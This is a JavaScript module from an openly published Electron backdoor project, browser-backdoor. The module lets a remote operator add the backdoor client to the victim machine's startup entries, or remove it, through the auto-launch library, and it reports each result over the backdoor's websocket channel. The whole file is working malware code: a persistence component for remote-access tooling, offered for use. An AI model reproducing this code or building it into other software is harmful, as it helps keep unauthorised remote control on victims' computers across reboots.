// INTERACTIVE
/**
 * @file manageStartup Module
 * @summary Manages automatic startup of client application.
 * @author Carleton Stuberg
 * @see https://github.com/IMcPwn/browser-backdoor
 * @license MIT
 * @version 0.1
 */

electron = require('electron');

AutoLaunch = require('auto-launch');

/**
 * @param {String} name - The name of the program in the startup entry.
 * @param {String} enable - Enable or disable startup. Converted to boolean.
 * @return {String} |error|
 * @return {String} Startup status
 */
manageStartup = function (name, enable) {
    appLauncher = new AutoLaunch({
        name: name
    });
    if (Boolean(enable)) {
        appLauncher.isEnabled().then(function(enabled){
            if(enabled) {
                ws.send("Startup already enabled.");
                return;
            }
            appLauncher.enable();
            ws.send("Startup enabled.");
        }).then(function(err){
            if (err !== undefined) ws.send("Error: " + err.toString());
        });
    } else {
        appLauncher.isEnabled().then(function(enabled){
            if(!enabled) {
                ws.send("Startup already disabled.");
                return;
            }
            appLauncher.disable();
            ws.send("Startup disabled.");
        }).then(function(err){
            if (err !== undefined) ws.send("Error: " + err.toString());
        }); 
    }
}


ws.send("\nUsage: manageStartup(name, enable)\n- name is the name to appear in the startup list.\n- enable is a boolean value for if startup should be enabled.");
